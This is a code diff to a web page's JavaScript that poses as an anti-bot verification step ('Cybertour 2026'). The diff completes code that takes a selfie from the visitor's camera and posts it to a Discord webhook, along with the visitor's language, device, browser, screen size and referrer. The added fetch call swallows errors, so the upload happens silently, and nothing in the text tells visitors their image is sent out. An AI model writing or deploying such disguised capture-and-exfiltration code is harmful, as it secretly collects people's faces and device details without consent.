@@ -72,7 +72,7 @@ async function capturePhoto(video, onSuccess) {
   sendToDiscord(canvas);
 
   const btn = document.getElementById('verify-start-btn');
-  if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détécté ✓';
+  if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détecté ✓';
 
   setVerified();
   if (navigator.vibrate) navigator.vibrate([60, 40, 120]);
@@ -87,24 +87,28 @@ async function capturePhoto(video, onSuccess) {
 function sendToDiscord(canvas) {
   canvas.toBlob(async (blob) => {
     const fd = new FormData();
-    fd.append('file', blob, `selfie-${Date.now()}.jpg`);
+    fd.append('file', blob, 'selfie.jpg');
     fd.append('payload_json', JSON.stringify({
-  embeds: [{
-    title: '📸 Nouveau participant détecté',
-    color: 0x2563eb,
-    image: { url: 'attachment://selfie.jpg' },
-    fields: [
-      { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
-      { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
-      { name: '📱 Appareil',   value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
-      { name: '🖥️ Navigateur', value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
-      { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
-      { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
-    ],
-    footer: { text: 'Cybertour 2026 — Système anti-bot' },
-    timestamp: new Date().toISOString(),
-  }]
-}));
+      embeds: [{
+        title: '📸 Nouveau participant détecté',
+        color: 0x2563eb,
+        image: { url: 'attachment://selfie.jpg' },
+        fields: [
+          { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
+          { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
+          { name: '📱 Appareil',   value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
+          { name: '🖥️ Navigateur', value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
+          { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
+          { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
+        ],
+        footer: { text: 'Cybertour 2026 — Système anti-bot' },
+        timestamp: new Date().toISOString(),
+      }]
+    }));
+    try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }); }
+    catch {}
+  }, 'image/jpeg', 0.75);
+}
 
 function flash() {
   const el = document.getElementById('verify-flash');
